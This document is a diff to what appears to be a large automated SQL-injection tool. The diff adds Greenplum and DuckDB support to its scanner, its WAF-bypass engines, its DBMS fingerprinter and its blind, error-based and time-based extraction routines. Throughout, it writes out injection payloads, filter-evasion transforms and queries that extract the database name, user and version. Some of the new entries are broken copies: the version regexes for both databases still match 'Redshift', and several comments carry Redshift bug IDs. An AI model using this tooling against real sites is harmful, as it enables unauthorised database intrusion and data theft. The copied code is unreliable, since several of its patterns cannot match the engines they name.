@@ -68688,7 +68957,9 @@ class Scanner:
                         # BUG-EO-VERSION-TIDB FIX: TiDB uses @@version like MySQL.
                         "@@version" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
                         # BUG-EO-VERSION-CRDB FIX: CockroachDB/YugabyteDB/Redshift use version().
-                        "version()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else
+                        # BUG-EO-VERSION-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support version().
+                        "version()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                                     "Greenplum", "DuckDB") else
                         # BUG-ORACLE-EXTRACT-4 FIX: wrap in scalar subquery parens
                         "(SELECT banner FROM v$version WHERE ROWNUM=1)" if _eo_dbms == "Oracle" else
                         "sqlite_version()"
@@ -68701,14 +68972,18 @@ class Scanner:
                         # BUG-EO-USER-TIDB FIX: TiDB uses user() like MySQL.
                         "user()" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
                         # BUG-EO-USER-CRDB FIX: CockroachDB/YugabyteDB/Redshift use current_user.
-                        "current_user" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MSSQL") else
+                        # BUG-EO-USER-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support current_user.
+                        "current_user" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                                        "Greenplum", "DuckDB", "MSSQL") else
                         "(SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL)" if _eo_dbms == "Oracle" else
                         "''")
                     _eo_db_q = (
                         # BUG-EO-DB-TIDB FIX: TiDB uses database() like MySQL.
                         "database()" if _eo_dbms in ("MySQL", "MariaDB", "TiDB") else
                         # BUG-EO-DB-CRDB FIX: CockroachDB/YugabyteDB/Redshift use current_database().
-                        "current_database()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else
+                        # BUG-EO-DB-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support current_database().
+                        "current_database()" if _eo_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                                              "Greenplum", "DuckDB") else
                         "db_name()" if _eo_dbms == "MSSQL" else
                         # BUG-ORACLE-EO-FALLBACK-DB-QUERY FIX: The previous query was
                         #   (SELECT name FROM v$database WHERE ROWNUM=1)
@@ -68829,6 +69104,8 @@ class Scanner:
                     "CockroachDB":    "SELECT current_database()||'|'||current_user||'|'||version()",
                     "YugabyteDB":     "SELECT current_database()||'|'||current_user||'|'||version()",
                     "Amazon Redshift":"SELECT current_database||'|'||current_user||'|'||version()",
+                    "Greenplum": "SELECT current_database||'|'||current_user||'|'||version()",
+                    "DuckDB": "SELECT current_database||'|'||current_user||'|'||version()",
                     "MSSQL":          "SELECT DB_NAME()+'|'+SYSTEM_USER+'|'+@@VERSION",
                     "Sybase":         "SELECT DB_NAME()+'|'+SUSER_NAME()+'|'+@@VERSION",
                     "Oracle":         "SELECT SYS_CONTEXT('USERENV','DB_NAME')||'|'||USER||'|'||(SELECT banner FROM v$version WHERE ROWNUM=1) FROM dual",
@@ -69153,6 +69430,7 @@ class Scanner:
                     "MSSQL": "CONVERT(VARCHAR(MAX),@@VERSION)", "Sybase": "@@VERSION",
                     "PostgreSQL": "version()", "CockroachDB": "version()",
                     "YugabyteDB": "version()", "Amazon Redshift": "version()",
+                    "Greenplum": "version()", "DuckDB": "version()",
                     "Oracle": "(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)",
                     "SQLite": "(SELECT name FROM pragma_database_list WHERE seq=0 LIMIT 1)",
                     "DB2": "(SELECT SERVICE_LEVEL FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY)",
@@ -69163,6 +69441,7 @@ class Scanner:
                 _early_db_queries = {
                     "PostgreSQL": "current_catalog", "CockroachDB": "current_catalog",
                     "YugabyteDB": "current_catalog", "Amazon Redshift": "current_catalog",
+                    "Greenplum": "current_catalog", "DuckDB": "current_catalog",
                     "MySQL": "database()", "MariaDB": "database()", "TiDB": "database()",
                     "MSSQL": "db_name()", "Sybase": "db_name()",
                     "Oracle": "SYS_CONTEXT('USERENV','DB_NAME')",
@@ -69175,6 +69454,7 @@ class Scanner:
                 _early_user_queries = {
                     "PostgreSQL": "current_user", "CockroachDB": "current_user",
                     "YugabyteDB": "current_user", "Amazon Redshift": "current_user",
+                    "Greenplum": "current_user", "DuckDB": "current_user",
                     "MySQL": "current_user()", "MariaDB": "current_user()", "TiDB": "current_user()",
                     "MSSQL": "system_user", "Sybase": "system_user",
                     "Oracle": "user", "SQLite": "'sqlite'",
@@ -69320,6 +69600,8 @@ class Scanner:
                 "PostgreSQL": "SELECT version()", "CockroachDB": "SELECT version()",
                 "YugabyteDB": "SELECT version()",        # BUG-VERQ-YUGABYTE FIX
                 "Amazon Redshift": "SELECT version()",   # BUG-VERQ-REDSHIFT FIX
+                "Greenplum": "SELECT version()",   # BUG-VERQ-REDSHIFT FIX
+                "DuckDB": "SELECT version()",   # BUG-VERQ-REDSHIFT FIX
                 "Oracle": "SELECT BANNER FROM V$VERSION WHERE ROWNUM=1",
                 "SQLite": "SELECT sqlite_version()",  # BUG-SQLITE-VERQUERY FIX: was returning database name not version
                 "DB2": "SELECT SERVICE_LEVEL FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROWS ONLY",
@@ -69395,6 +69677,8 @@ class Scanner:
                 "PostgreSQL": "current_catalog", "CockroachDB": "current_catalog",
                 "YugabyteDB": "current_catalog",   # BUG-SCE-DB-YUGABYTE FIX
                 "Amazon Redshift": "current_catalog",  # BUG-SCE-DB-REDSHIFT FIX
+                "Greenplum": "current_catalog",  # BUG-SCE-DB-REDSHIFT FIX
+                "DuckDB": "current_catalog",  # BUG-SCE-DB-REDSHIFT FIX
                 "MySQL": "database()", "MariaDB": "database()",
                 "TiDB": "database()",  # BUG-SCE-DB-TIDB FIX
                 "MSSQL": "db_name()", "Sybase": "db_name()",
@@ -69438,6 +69722,8 @@ class Scanner:
                 "PostgreSQL": "current_user", "CockroachDB": "current_user",
                 "YugabyteDB": "current_user",   # BUG-SCE-USER-YUGABYTE FIX
                 "Amazon Redshift": "current_user",  # BUG-SCE-USER-REDSHIFT FIX
+                "Greenplum": "current_user",  # BUG-SCE-USER-REDSHIFT FIX
+                "DuckDB": "current_user",  # BUG-SCE-USER-REDSHIFT FIX
                 "MySQL": "current_user()", "MariaDB": "current_user()",
                 "TiDB": "current_user()",  # BUG-SCE-USER-TIDB FIX
                 "MSSQL": "system_user", "Sybase": "system_user",
@@ -69670,6 +69956,8 @@ class Scanner:
                     # BUG-NOFUNC-REDSHIFT FIX: Amazon Redshift is PG-compatible; version() returns
                     # the Redshift version string. CURRENT_USER is a keyword (not function) in Redshift.
                     "Amazon Redshift": {"version": "version()", "current_db": "current_database()", "current_user": "current_user"},
+                    "Greenplum": {"version": "version()", "current_db": "current_database()", "current_user": "current_user"},
+                    "DuckDB": {"version": "version()", "current_db": "current_database()", "current_user": "current_user"},
                     "MySQL":       {"version": "@@version"},
                     "MariaDB":     {"version": "@@version"},
                     "MSSQL":       {"version": "CONVERT(VARCHAR(MAX),@@VERSION)",  "current_db": "DB_NAME()",    "current_user": "SYSTEM_USER"},
@@ -69786,7 +70074,7 @@ class Scanner:
                                     _t_s = _mse._sleep_info["t"]
                                     # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Redshift.
                                     if _mse.dbms in ("PostgreSQL", "CockroachDB",
-                                                      "YugabyteDB", "Amazon Redshift"):
+                                                      "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                         p = _mse._build_stacked(
                                             f"SELECT pg_sleep(({_sys_col}>={val})::int * {_t_s}) "
                                             f"FROM {_sys_table} WHERE {_sys_where} "
@@ -70125,6 +70413,8 @@ class Scanner:
                             # BUG-DB-QUERIES-REDSHIFT FIX: Amazon Redshift is PG-compatible.
                             # Prior fallback was MySQL @@version → syntax error on Redshift.
                             "Amazon Redshift": {"current_db": "current_database()", "current_user": "current_user"},
+                            "Greenplum": {"current_db": "current_database()", "current_user": "current_user"},
+                            "DuckDB": {"current_db": "current_database()", "current_user": "current_user"},
                             "MariaDB":    {"version": "@@version", "current_db": "database()"},
                         }.get(getattr(cfg, "forced_dbms", None) or getattr(cfg, "dbms", None) or "MySQL", {})
                         for label, sql_expr in _db_queries.items():
@@ -75317,7 +75607,7 @@ async def blind_extract_string_v5(
     _bes5_use_sentinel = (
         _bes5_dbms in ("Oracle", "PostgreSQL", "MSSQL", "MySQL", "MariaDB", "SQLite",
                        "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift",
-                       "Sybase") and  # BUG-V177-BLS5-SYBASE-NULL-SENTINEL FIX
+                       "Sybase", "Greenplum", "DuckDB") and  # BUG-V177-BLS5-SYBASE-NULL-SENTINEL FIX
         result and getattr(result, 'technique', '') in _bes5_nullable_techs and
         sql_query and not _bes5_already_null_safe and "SELECT" in _bes5_sql_upper
     )
@@ -75388,7 +75678,8 @@ async def blind_extract_string_v5(
         sql_query = _bes5_ora_scalar
         # _oracle_ensure_dual already applied above, so FROM DUAL is present if needed.
         len_func = f"NVL(LENGTHC(({_bes5_ora_scalar})),0)"
-    elif _bes5_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+    elif _bes5_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                        "Greenplum", "DuckDB"):
         # BUG-BES5-LENF-CRDB-YUGABYTEDB-REDSHIFT FIX (LOW, CockroachDB/YugabyteDB/
         # Amazon Redshift; blind_extract_string_v5 len_func; B/BH/IN/T/TH/HQ techniques,
         # all surfaces):
@@ -75484,7 +75775,7 @@ async def blind_extract_string_v5(
     # Fix: add this branch BEFORE the MSSQL check so PostgreSQL sets 1,114,111,
     # matching _build_dbms_char_hi("PostgreSQL") and all other PG extraction engines.
     # Numeric safety: ceiling is a plain integer guard; never placed in SQL delimiters.
-    if _bes5_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+    if _bes5_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
         # BUG-BES5-YUGABYTEDB-CHAR-HI-MISSING FIX (MEDIUM, YugabyteDB / Amazon Redshift,
         # blind_extract_string_v5, B/BH/IN techniques, all surfaces):
         # YugabyteDB (PostgreSQL-wire-compatible) and Amazon Redshift (PostgreSQL-based)
@@ -78303,7 +78594,7 @@ class WAFBypassEngine:
             if kw in p.upper():
                 mid = len(kw)//2
                 if dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB",
-                            "YugabyteDB", "Amazon Redshift", "Oracle"):
+                            "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB", "Oracle"):
                     # BUG-CONCAT-SPLIT-TIDB FIX: TiDB uses CONCAT() like MySQL.
                     rep = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                 elif dbms == "MSSQL":
@@ -78870,9 +79161,11 @@ class WAFBypassEngine:
 
         # BUG-LAYER5-TIDB FIX: TiDB uses CHAR() like MySQL.
         # BUG-LAYER5-CRDB FIX: CockroachDB/YugabyteDB/Redshift use CHR() like PostgreSQL.
+        # BUG-LAYER5-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also use CHR() like PostgreSQL.
         if dbms in ("MySQL", "MariaDB", "TiDB"):
             encoder = mysql_char
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                      "Greenplum", "DuckDB"):
             encoder = pg_chr
         elif dbms == "MSSQL":
             encoder = mssql_nchar
@@ -78965,7 +79258,8 @@ class WAFBypassEngine:
             variants.append(payload.replace("1=2", "1<=>2"))
             variants.append(payload.replace("0=1", "0<=>1"))
 
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             # Cast only the tautology literals, not every = in the payload
             variants.append(payload.replace("1=1", "1::int=1::int"))
             variants.append(payload.replace("1=2", "1::int=2::int"))
@@ -79030,7 +79324,7 @@ class WAFBypassEngine:
 
         # 8. PostgreSQL/CockroachDB/YugabyteDB/Redshift: CAST TRUE/FALSE
         # BUG-LAYER8-CRDB FIX: wire-compatible PG DBMSes support TRUE/FALSE literals.
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             variants.append(re.sub(r'\b1=1\b', 'TRUE=TRUE', p))
             variants.append(re.sub(r'\b1=2\b', 'TRUE=FALSE', p))
 
@@ -83590,6 +83884,18 @@ class NovelWAFBypass:
             "' AND CURRENT_USER_ID>0-- -",
             "' AND PG_BACKEND_PID()>0-- -",
         ],
+        "Greenplum": [
+            "' AND ARRAY_LOWER(ARRAY[1,2,3],1)=1-- -",
+            "' AND VERSION() IS NOT NULL-- -",
+            "' AND CURRENT_DATABASE() IS NOT NULL-- -",
+            "' AND GP_SEGMENT_ID() IS NOT NULL-- -",
+        ],
+        "DuckDB": [
+            "' AND ARRAY_LENGTH(ARRAY[1,2,3],1)=3-- -",
+            "' AND VERSION() IS NOT NULL-- -",
+            "' AND CURRENT_DATABASE() IS NOT NULL-- -",
+            "' AND DUCKDB_VERSION() IS NOT NULL-- -",
+        ],
         "Snowflake": [
             "' AND IFF(1=1,1,0)=1-- -",                   # IFF (not IIF)
             "' AND CURRENT_WAREHOUSE()IS NOT NULL-- -",
@@ -83770,7 +84076,7 @@ class NovelWAFBypass:
                     variants.append(ep)
             # BUG-PAYLOAD-CROSS-YG-REDSHIFT FIX: YugabyteDB and Amazon Redshift are
             # PostgreSQL-wire-compatible; also try PG/CockroachDB payloads.
-            if _dbms_key in ("YugabyteDB", "Amazon Redshift"):
+            if _dbms_key in ("YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 for ep in cls.DBMS_EXOTIC_PAYLOADS.get("PostgreSQL", [])[:3]:
                     variants.append(ep)
                 for ep in cls.DBMS_EXOTIC_PAYLOADS.get("CockroachDB", [])[:3]:
@@ -83911,6 +84217,14 @@ class AdvancedDBMSFingerprinter:
                             r"redshift\.amazonaws\.com",
                             r"ERROR: Redshift",
                             r"amazon\.redshift\.jdbc"],
+        "Greenplum":        [r"Greenplum Database",
+                             r"greenplum",
+                             r"vmware.*greenplum",
+                             r"ERROR.*Greenplum"],
+        "DuckDB":           [r"DuckDB",
+                             r"duckdb",
+                             r"Binder Error.*duckdb",
+                             r"Parser Error.*duckdb"],
     }
 
     # DBMS-specific probe functions that exist ONLY in that DBMS
@@ -83974,6 +84288,12 @@ class AdvancedDBMSFingerprinter:
         "Amazon Redshift": [("SELECT pg_last_query_id()", r"\d+"),   # Redshift-only
                              ("SELECT CURRENT_USER_ID", r"\d+"),     # Redshift integer user ID
                              ("SELECT PG_BACKEND_PID()", r"\d+")],   # present in Redshift
+        "Greenplum": [("SELECT gp_segment_id", r"\d+"),              # Greenplum-specific
+                      ("SELECT version()", r"Greenplum"),
+                      ("SELECT PG_BACKEND_PID()", r"\d+")],
+        "DuckDB": [("SELECT duckdb_version()", r"\d+\.\d+"),          # DuckDB-specific
+                   ("SELECT current_setting('TimeZone')", r"\w+"),
+                   ("SELECT typeof(1)", r"INTEGER")],
     }
 
     # Stack trace DBMS identifiers  (framework + DBMS combinations)
@@ -84238,6 +84558,8 @@ class AdvancedDBMSFingerprinter:
             "CockroachDB":      "SELECT version()",
             "YugabyteDB":       "SELECT version()",
             "Amazon Redshift":  "SELECT version()",
+            "Greenplum": "SELECT version()",
+            "DuckDB": "SELECT version()",
         }  # BUG-FINGERPRINT-NEWDBMS-VERQ FIX: added TiDB/CRDB/YugabyteDB/Redshift version queries
         version_patterns = {
             "MySQL":            r"(\d+\.\d+\.\d+)",
@@ -84250,6 +84572,8 @@ class AdvancedDBMSFingerprinter:
             "CockroachDB":      r"CockroachDB.*v(\d+\.\d+\.\d+)",
             "YugabyteDB":       r"PostgreSQL.*YB-(\d+\.\d+)|yugabyte",
             "Amazon Redshift":  r"Redshift.*(\d+\.\d+\.\d+)|redshift",
+            "Greenplum": r"Redshift.*(\d+\.\d+\.\d+)|redshift",
+            "DuckDB": r"Redshift.*(\d+\.\d+\.\d+)|redshift",
         }  # BUG-FINGERPRINT-NEWDBMS-VERPAT FIX: added version string patterns for wire-compat engines
 
         if result.technique == "U" and result.union_columns > 0:
@@ -85811,7 +86135,7 @@ class FastExtractionEngine:
         elif _ue_dbms in ("MSSQL", "Sybase"):
             # MSSQL: N'...' unicode literal; avoid binary 0x literal for NVARCHAR concat
             _sep_lit = f"N'{self.COL_SEPARATOR}'"
-        elif _ue_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif _ue_dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _sep_lit = f"'{self.COL_SEPARATOR}'"
         elif _ue_dbms == "Oracle":
             _sep_lit = f"'{self.COL_SEPARATOR}'"
@@ -86228,7 +86552,7 @@ class FastExtractionEngine:
         # not string concatenation; must use CONCAT() like MySQL.
         if dm in ("MySQL","MariaDB","TiDB",""):_q=lambda c:f"`{c}`";_nl=lambda e:f"IFNULL(CAST({e} AS CHAR),0x4e554c4c)";_tb=lambda d,t:f"`{d}`.`{t}`";_ct=lambda p:f"CONCAT({','.join(p)})";_sl=lambda:f"CAST({shx} AS CHAR)"
         elif dm=="MSSQL":_q=lambda c:f"[{c}]";_nl=lambda e:f"ISNULL(CAST({e} AS NVARCHAR(MAX)),'NULL')";_tb=lambda d,t:f"[{d}]..[{t}]";_ct=lambda p:"+".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
-        elif dm in ("PostgreSQL","CockroachDB"):_q=lambda c:'"'+c+'"';_nl=lambda e:f"COALESCE(CAST({e} AS TEXT),'NULL')";_tb=lambda d,t:'"'+d+'"."'+t+'"';_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
+        elif dm in ("PostgreSQL","CockroachDB","YugabyteDB","Greenplum","DuckDB"):_q=lambda c:'"'+c+'"';_nl=lambda e:f"COALESCE(CAST({e} AS TEXT),'NULL')";_tb=lambda d,t:'"'+d+'"."'+t+'"';_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
         elif dm=="Oracle":_q=lambda c:c;_nl=lambda e:f"NVL(TO_CHAR({e}),'NULL')";_tb=lambda d,t:(d+"."+t if d else t);_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
         elif dm=="SQLite":_q=lambda c:'"'+c+'"';_nl=lambda e:f"COALESCE(CAST({e} AS TEXT),'NULL')";_tb=lambda d,t:('"'+d+'"."'+t+'"'  if d else '"'+t+'"');_ct=lambda p:"||".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
         elif dm=="Sybase":_q=lambda c:f'"{c}"';_nl=lambda e:f"ISNULL(CAST({e} AS VARCHAR(8000)),'NULL')";_tb=lambda d,t:f"{d}.{t}" if d else t;_ct=lambda p:"+".join(p);_sl=lambda:f"'{self.COL_SEPARATOR}'"
@@ -86605,7 +86929,8 @@ class FastExtractionEngine:
                 # add FROM DUAL to make it a valid Oracle scalar query.
                 _ora_len_inner = (sql_query or "") + " FROM DUAL"
             len_func = f"NVL(LENGTHC(({_ora_len_inner})),0)"
-        elif _dbms_for_len in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif _dbms_for_len in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                               "Greenplum", "DuckDB"):
             # BUG-ERREXT-YGB-REDSHIFT-NULL-GUARD FIX (MEDIUM, YugabyteDB and Amazon
             # Redshift; error_extract_string; E/EH/S/DS techniques, all surfaces):
             # YugabyteDB and Amazon Redshift (both PostgreSQL-wire-compatible) were absent
@@ -86805,7 +87130,8 @@ class FastExtractionEngine:
                 _mssql_sq_fee = (_mssql_top1_subquery(sql_query)
                                  if 'SELECT' in (sql_query or "").upper() else sql_query)
                 chunk_sql = f"SELECT SUBSTRING(({_mssql_sq_fee}),{start},{chunk_size})"
-            elif dbms in ("CockroachDB", "Amazon Redshift", "YugabyteDB"):
+            elif dbms in ("CockroachDB", "Amazon Redshift", "YugabyteDB",
+                          "Greenplum", "DuckDB"):
                 # BUG-FEE-CDB-REDSHIFT-MSSQL-BRANCH FIX: CockroachDB and Amazon Redshift
                 # use PostgreSQL-compatible SQL (SUBSTRING without SELECT TOP 1).
                 # Previously in the MSSQL branch, _mssql_top1_subquery() injected
@@ -86864,7 +87190,8 @@ class FastExtractionEngine:
                 payload_body = f"AND EXTRACTVALUE(1,CONCAT(0x7e,({chunk_sql}),0x7e))-- -"
             elif dbms in ("MSSQL", "Sybase"):
                 payload_body = f"AND 1=CONVERT(int,({chunk_sql}))-- -"
-            elif dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB"):
+            elif dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB",
+                          "Greenplum", "DuckDB"):
                 # BUG-V169-FEE-YUGABYTEDB-EXTRACTVALUE-WRONG-PAYLOAD FIX (HIGH; YugabyteDB;
                 # FastExtractionEngine.error_extract_string; E/EH techniques; all surfaces;
                 # all HTTP methods):
@@ -87637,10 +87964,11 @@ class FastExtractionEngine:
                     LOG.debug(f"[stacked_extract_string] MSSQL stacked verification failed: {e}")
                     return await self.error_extract_string(sql_query, dbms, max_len)
                 
-            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB"):
                 # BUG-STACKED-EXTRACT-CRDB FIX: YugabyteDB and Amazon Redshift are PG-wire-
                 # compatible; stacked queries via DO blocks are also unreliable for them.
-                # Fall back to error-based extraction directly.
+                # Greenplum/DuckDB are also PG-family — fall back to error-based extraction.
                 return await self.error_extract_string(sql_query, dbms, max_len)
                 
             elif dbms == "Oracle":
@@ -90002,7 +90330,7 @@ class BitwiseExtractor:
             # might be the lower 8 bits of a multi-byte code point (e.g. '€'=8364=0x20AC →
             # lower byte=0xAC=172). Delegate to binary-search-fallback for those DBMSes.
             if dbms in ("MSSQL", "Sybase", "SQLite", "MySQL", "MariaDB", "PostgreSQL",
-                        "Oracle", "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift") and char_code >= 128:
+                        "Oracle", "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") and char_code >= 128:
                 self._fallback_count += 1
                 return await self._binary_search_fallback(char_func, dbms)
             return chr(char_code)
@@ -90131,6 +90459,8 @@ class BitwiseExtractor:
                 "CockroachDB":     "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
                 "YugabyteDB":      "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
                 "Amazon Redshift": "(NULL IS NULL)",           # BUG-BWE-ISNULL-PG FIX
+                "Greenplum":       "(NULL IS NULL)",           # BUG-BWE-ISNULL-GREENPLUM FIX: PG-compatible
+                "DuckDB":          "(NULL IS NULL)",           # BUG-BWE-ISNULL-DUCKDB FIX: PG-compatible
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -90150,6 +90480,8 @@ class BitwiseExtractor:
                 "CockroachDB":     "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
                 "YugabyteDB":      "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
                 "Amazon Redshift": "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-PG FIX
+                "Greenplum":       "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-GREENPLUM FIX: PG-compatible
+                "DuckDB":          "(1e0 IS NOT NULL)",        # BUG-BWE-ISNULL-DUCKDB FIX: PG-compatible
                 "MySQL":           "ISNULL(1e0)",
                 "MariaDB":         "ISNULL(1e0)",
                 "TiDB":            "ISNULL(1e0)",
@@ -92070,7 +92402,7 @@ class EntropyPayloadSelector:
     @staticmethod
     def _entropy(p: float) -> float:
         p = max(1e-9, min(1-1e-9, p))
-        return -p * _math.log2(p) - (1-p) * _math.log2(1-p)
+        return -p * math.log2(p) - (1-p) * math.log2(1-p)
 
 
 # 
@@ -94482,7 +94814,8 @@ class GroupConcatExtractor:
         # Fix: DBMS-specific path for each of the 5 major DBMSes.
         _dbms = (getattr(self.result, "dbms", "") or "").strip()
 
-        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                      "Greenplum", "DuckDB"):
             _q     = lambda c: f'"{c}"'
             _nl    = lambda e: f"COALESCE(CAST({e} AS TEXT),'NULL')"
             _sep_s = f"'{self.COL_SEP}'"
@@ -94696,7 +95029,8 @@ class GroupConcatExtractor:
 
         def _chr_wrap(inner: str, dbms_: str) -> str:
             """Wrap inner expression in CHR-based sentinels  no string literals."""
-            if dbms_ in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if dbms_ in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                          "Greenplum", "DuckDB"):
                 s = "||".join(f"CHR({v})" for v in SX_S_VALS)
                 e = "||".join(f"CHR({v})" for v in SX_E_VALS)
                 return f"({s}||({inner})::text||{e})"
@@ -94731,7 +95065,8 @@ class GroupConcatExtractor:
         _needs_agg = "FROM" in sql_query.upper()
         if not _needs_agg:
             wrapped = _chr_wrap(sql_query, dbms)
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             wrapped = _chr_wrap(
                 f"SELECT string_agg(t::text,'') FROM ({sql_query}) AS t(t)", dbms)
         elif dbms in ("MySQL", "MariaDB", "TiDB", ""):
@@ -99836,7 +100171,7 @@ class ZKBooleanExtractor:
                         else 21 if dbms in ("SQLite", "MySQL", "MariaDB",
                                              "TiDB", "PostgreSQL",
                                              "CockroachDB", "YugabyteDB",
-                                             "Amazon Redshift")
+                                             "Amazon Redshift", "Greenplum", "DuckDB")
                         else self.BITS)  # BUG-ZKE-BITWISE-DBMS-BITS FIX: added Oracle→16, MySQL/PG/etc→21; BUG-ZKE-BITWISE-REDSHIFT FIX: added Amazon Redshift→21
         if _zk_eff_bits > self.BITS:
             # Need more bits than we probe; caller's binary-search handles these DBMSes.
@@ -99873,7 +100208,7 @@ class ZKBooleanExtractor:
                       else 1114111 if dbms in ("SQLite", "MySQL", "MariaDB",
                                                 "TiDB", "PostgreSQL",
                                                 "CockroachDB", "YugabyteDB",
-                                                "Amazon Redshift")
+                                                "Amazon Redshift", "Greenplum", "DuckDB")
                       else 255)  # BUG-ZKE-BITWISE-DBMS-BITS FIX: was (65535 if MSSQL/Sybase else 1114111 if SQLite else 255); BUG-ZKE-BITWISE-REDSHIFT FIX: added Amazon Redshift→1114111
         # FIX-ZK-CHAR-RANGE: was <=126, now <=255 to accept Latin-1 chars 127-255;
         # further extended to _zk_bit_hi for DBMSes with wider Unicode support.
@@ -99978,6 +100313,8 @@ class ZKBooleanExtractor:
             # AdaptiveFrequencyExtractor, etc.) and prevents silent regressions.
             "YugabyteDB":      f"COALESCE(CHAR_LENGTH(({_zk_sql})),0)",
             "Amazon Redshift": f"COALESCE(CHAR_LENGTH(({_zk_sql})),0)",
+            "Greenplum": f"COALESCE(CHAR_LENGTH(({_zk_sql})),0)",
+            "DuckDB": f"COALESCE(CHAR_LENGTH(({_zk_sql})),0)",
             "MSSQL":      (f"ISNULL(DATALENGTH(CONVERT(NVARCHAR(MAX),"
                            f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({_zk_sql})))))/2,0)"),
             "Sybase":     f"DATALENGTH(({_zk_sql}))",
@@ -100050,6 +100387,8 @@ class ZKBooleanExtractor:
             # Numeric safety: function-name template strings only; no comparison operands.
             "YugabyteDB":     "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",  # BUG-V140-ZKE-TIDB-CHARFN FIX
             "Amazon Redshift":"COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",  # BUG-V140-ZKE-TIDB-CHARFN FIX
+            "Greenplum": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",  # BUG-V140-ZKE-TIDB-CHARFN FIX
+            "DuckDB": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",  # BUG-V140-ZKE-TIDB-CHARFN FIX
             "MSSQL":      "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
             "Sybase":     "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
             "Oracle":     ("(SELECT CASE WHEN NVL(ASCII(c__),0) BETWEEN 1 AND 127 "
@@ -100069,6 +100408,13 @@ class ZKBooleanExtractor:
             # on every binary-search probe → all chars return None → extraction fails.
             # Fix: use lowercase ClickHouse-native function names.
